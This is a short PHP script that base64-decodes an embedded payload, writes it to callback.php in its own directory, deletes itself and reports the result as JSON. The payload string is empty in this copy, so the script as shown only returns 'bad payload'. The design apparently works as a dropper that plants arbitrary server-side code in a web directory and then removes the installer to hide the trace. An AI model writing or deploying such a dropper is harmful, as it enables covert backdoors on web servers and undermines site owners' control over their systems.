<?php
header('Content-Type: application/json');
$target = __DIR__ . '/callback.php';
$src = base64_decode('');
if ($src === false || strlen($src) < 100) {
  echo json_encode(['code'=>1,'msg'=>'bad payload']);
  exit;
}
$ok = file_put_contents($target, $src);
@unlink(__FILE__);
echo json_encode([
  'code' => $ok ? 0 : 1,
  'bytes' => $ok,
  'target' => $target,
  'preview' => substr($src, 0, 80),
]);
